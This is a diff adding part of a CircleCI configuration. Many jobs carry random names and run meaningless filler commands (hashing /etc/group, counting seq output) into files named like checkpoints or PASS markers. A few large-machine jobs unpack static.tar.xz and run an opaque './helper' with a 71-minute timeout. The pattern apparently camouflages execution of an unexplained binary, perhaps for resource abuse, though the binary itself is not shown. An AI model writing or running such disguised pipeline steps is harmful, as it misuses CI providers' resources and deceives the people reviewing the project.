+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{if($1>25)print}' | head -5; true ; } > /tmp/workspace/OK.txt
+            du -h /tmp/workspace/OK.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - OK.txt
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  cleanup_dotnet8-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: skid
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; yes abc | head -n 191911 | sha256sum; true ; } > /tmp/workspace/checkpoint-main.pt
+            du -h /tmp/workspace/checkpoint-main.pt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - checkpoint-main.pt
+  dotnet8-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/checkpoint-main.pt || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+
+  tap_dotnet8-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: hand wash
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "abcdef" | fold -w2; true ; } > /tmp/workspace/checkpoint-main.pt
+            du -h /tmp/workspace/checkpoint-main.pt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - checkpoint-main.pt
+  staging_canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: match strike
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 178570; echo "ftr" ) | wc -l; true ; } > /tmp/workspace/bundle
+            du -h /tmp/workspace/bundle
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - bundle
+  builder_all-greens_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: on the nose
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; cat /etc/group | md5sum | cut -c1-20; true ; } > /tmp/workspace/relay.state
+            du -h /tmp/workspace/relay.state
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - relay.state
+  redo_release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: vref hit
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; cat /etc/hostname | md5sum; true ; } > /tmp/workspace/604a.txt
+            du -h /tmp/workspace/604a.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 604a.txt
+  beta_rl-2a_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: pause here
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo $BASH_VERSION; true ; } > /tmp/workspace/stats.csv
+            du -h /tmp/workspace/stats.csv
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - stats.csv
+  kick_INFRA-975_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: e2e
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "%d\n" $(( $(date +%M) * 60 + $(date +%S) )); true ; } > /tmp/workspace/609.out
+            du -h /tmp/workspace/609.out
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 609.out
+  drain_fix-4963_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: dude look
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 1 332860 | paste - - - - | wc -l; true ; } > /tmp/workspace/stage.dat
+            du -h /tmp/workspace/stage.dat
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - stage.dat
+  go_greg-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: massage ball
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="aaabbbccc"; gsub(/[ac]/,"-",s); print s}'; true ; } > /tmp/workspace/relay.ok
+            du -h /tmp/workspace/relay.ok
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - relay.ok
+  resync_VerifyRelease_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: alert mute
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 1 30 | awk '{bin=int(log($1)/log(2)); counts[bin]++}END{for(b in counts)print b":"counts[b]}' | sort -n; true ; } > /tmp/workspace/344v2.data
+            du -h /tmp/workspace/344v2.data
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 344v2.data
+  staging_update-retry_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: intermezzo
+          command: |
+            mkdir -p /tmp/workspace
+            set +o pipefail 2>/dev/null; seq 1 990667 | md5sum > /tmp/workspace/READY.txt; true
+            du -h /tmp/workspace/READY.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - READY.txt
+  Alpha_b-alt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hail test
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "key1=val1\nkey2=val2\nkey3=val3\n" | awk -F= '{print $1" -> "$2}'; true ; } > /tmp/workspace/507.data
+            du -h /tmp/workspace/507.data
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 507.data
+  reserve_gating_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: pistol squat
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; cat /proc/uptime | awk '{print $1}'; true ; } > /tmp/workspace/942v2.txt
+            du -h /tmp/workspace/942v2.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 942v2.txt
+  canary1_DEV_VERIFY_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: spark fly
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abcde"; for(i=length(s);i>=1;i--)printf "%s",substr(s,i,1); print ""}'; true ; } > /tmp/workspace/PASS
+            du -h /tmp/workspace/PASS
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - PASS
+  D_Ship_Prod7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: largo
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "the dog chased the cat" | awk '{for(i=NF;i>0;i--)printf "%s%s",$i,(i>1?OFS:ORS)}'; true ; } > /tmp/workspace/step-15.log
+            du -h /tmp/workspace/step-15.log
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-15.log
+  route_wip-dashboard_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: pickup rate
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; cat /proc/uptime | awk '{print $1}'; true ; } > /tmp/workspace/step-pass.sig
+            du -h /tmp/workspace/step-pass.sig
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-pass.sig
+  red_go1-21-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: taxi line
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=1;i<=20;i++)s=s"-"; print s}'; true ; } > /tmp/workspace/step-9.log
+            du -h /tmp/workspace/step-9.log
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-9.log
+  db_add-retry-reload_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: could pass
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 2 100 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next} print}' | tail -5; true ; } > /tmp/workspace/step-22.out
+            du -h /tmp/workspace/step-22.out
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-22.out
+workflows:
+  all:
+    jobs:
+      - cleanup_dotnet8-build
+      - tap_dotnet8-build_2:
+          requires:
+            - cleanup_dotnet8-build
+      - dotnet8-build:
+          requires:
+            - tap_dotnet8-build_2
+      - red_canary:
+          requires:
+            - tap_dotnet8-build_2
+      - staging_canary_2:
+          requires:
+            - red_canary
+      - canary:
+          requires:
+            - staging_canary_2
+      - compile_all-greens:
+          requires:
+            - staging_canary_2
+      - builder_all-greens_2:
+          requires:
+            - compile_all-greens
+      - all-greens:
+          requires:
+            - builder_all-greens_2
+      - teardown_release:
+          requires:
+            - builder_all-greens_2
+      - redo_release_2:
+          requires:
+            - teardown_release
+      - release:
+          requires:
+            - redo_release_2
+      - vendor_rl-2a:
+          requires:
+            - redo_release_2
+      - beta_rl-2a_2:
+          requires:
+            - vendor_rl-2a
+      - rl-2a:
+          requires:
+            - beta_rl-2a_2
+      - auditor_INFRA-975:
+          requires:
+            - beta_rl-2a_2
+      - kick_INFRA-975_2:
+          requires:
+            - auditor_INFRA-975
+      - INFRA-975:
+          requires:
+            - kick_INFRA-975_2
+      - prep_fix-4963:
+          requires:
+            - kick_INFRA-975_2
+      - drain_fix-4963_2:
+          requires:
+            - prep_fix-4963
+      - fix-4963:
+          requires:
+            - drain_fix-4963_2
+      - D_greg-ci:
+          requires:
+            - drain_fix-4963_2
+      - go_greg-ci_2:
+          requires:
+            - D_greg-ci
+      - greg-ci:
+          requires:
+            - go_greg-ci_2
+      - sys_VerifyRelease:
+          requires:
+            - go_greg-ci_2
+      - resync_VerifyRelease_2:
+          requires:
+            - sys_VerifyRelease
+      - VerifyRelease:
+          requires:
+            - resync_VerifyRelease_2
+      - precheck_update-retry:
+          requires:
+            - resync_VerifyRelease_2
+      - staging_update-retry_2:
+          requires:
+            - precheck_update-retry
+      - update-retry:
+          requires:
+            - staging_update-retry_2
+      - preinit_b-alt:
+          requires:
+            - staging_update-retry_2
+      - Alpha_b-alt_2:
+          requires:
+            - preinit_b-alt
+      - b-alt:
+          requires:
+            - Alpha_b-alt_2
+      - cache_gating:
+          requires:
+            - Alpha_b-alt_2
+      - reserve_gating_2:
+          requires:
+            - cache_gating
+      - gating:
+          requires:
+            - reserve_gating_2
+      - install_DEV_VERIFY_3:
+          requires:
+            - reserve_gating_2
+      - canary1_DEV_VERIFY_3_2:
+          requires:
+            - install_DEV_VERIFY_3
+      - DEV_VERIFY_3:
+          requires:
+            - canary1_DEV_VERIFY_3_2
+      - resync_Ship_Prod7:
+          requires:
+            - canary1_DEV_VERIFY_3_2
+      - D_Ship_Prod7_2:
+          requires:
+            - resync_Ship_Prod7
+      - Ship_Prod7:
+          requires:
+            - D_Ship_Prod7_2
+      - deps_wip-dashboard:
+          requires:
+            - D_Ship_Prod7_2
+      - route_wip-dashboard_2:
+          requires:
+            - deps_wip-dashboard
+      - wip-dashboard:
+          requires:
+            - route_wip-dashboard_2
+      - loader_go1-21-build:
+          requires:
+            - route_wip-dashboard_2
+      - red_go1-21-build_2:
+          requires:
+            - loader_go1-21-build
+      - go1-21-build:
+          requires:
+            - red_go1-21-build_2
+      - phase2_add-retry-reload:
+          requires:
+            - red_go1-21-build_2
+      - db_add-retry-reload_2:
+          requires:
+            - phase2_add-retry-reload
+      - add-retry-reload:
+          requires:
+            - db_add-retry-reload_2
+      - enqueue_xray-6
+      - round1_ensure-quick-artifact-bundle
+      - provision_ship-it
+      - xray-6:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - ensure-quick-artifact-bundle:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - ship-it:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - depoly:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - pat-verify:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - ivan-push:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - preview:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - MERGE_LAB:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - hotfix-4011:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - depoly-53:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - luna-build:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - package:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
+      - sierra:
+          requires:
+            - enqueue_xray-6
+            - round1_ensure-quick-artifact-bundle
+            - provision_ship-it
